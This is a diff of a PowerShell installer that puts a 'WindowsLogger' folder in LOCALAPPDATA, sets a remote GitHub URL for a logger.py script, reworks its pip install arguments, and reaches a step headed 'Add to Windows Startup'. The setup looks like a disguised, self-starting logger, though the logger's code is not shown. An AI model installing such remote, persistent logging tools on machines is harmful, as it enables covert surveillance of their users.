@@ -3,8 +3,9 @@
 # =============================================
 
 $installDir = "$env:LOCALAPPDATA\WindowsLogger"
-if (!(Test-Path $installDir)) { 
-    New-Item -ItemType Directory -Path $installDir -Force | Out-Null 
+
+if (!(Test-Path $installDir)) {
+    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 }
 
 $loggerUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/logger.py"
@@ -52,23 +53,30 @@ try {
     Exit
 }
 
-# 3. Install requirements (Improved with better error handling)
+# 3. Install requirements (Fixed & Improved)
 Write-Host "[*] Installing required Python packages..." -ForegroundColor Yellow
 Set-Location $installDir
 
-# Improve pip reliability
-python -m pip install --upgrade pip --quiet
-python -m pip install --upgrade setuptools wheel --quiet
+# Update pip and core tools
+python -m pip install --upgrade pip setuptools wheel --quiet
 
-# Main install with retry-friendly options
-$pipArgs = "-r requirements.txt --no-cache-dir --timeout 120 --retries 5 --quiet"
-$installResult = python -m pip install $pipArgs
+# Correct argument passing using array (This fixes the previous error)
+$pipArgs = @(
+    "-m", "pip", "install",
+    "-r", "requirements.txt",
+    "--no-cache-dir",
+    "--timeout", "180",
+    "--retries", "10",
+    "--quiet"
+)
+
+$installResult = & python $pipArgs
 
 if ($LASTEXITCODE -eq 0) {
     Write-Host "[+] All packages installed successfully." -ForegroundColor Green
 } else {
     Write-Host "[!] Installation had issues. Trying alternative method..." -ForegroundColor Yellow
-    python -m pip install -r requirements.txt --no-cache-dir --timeout 180 --retries 10
+    python -m pip install -r requirements.txt --no-cache-dir --timeout 200 --retries 15
 }
 
 # 4. Add to Windows Startup
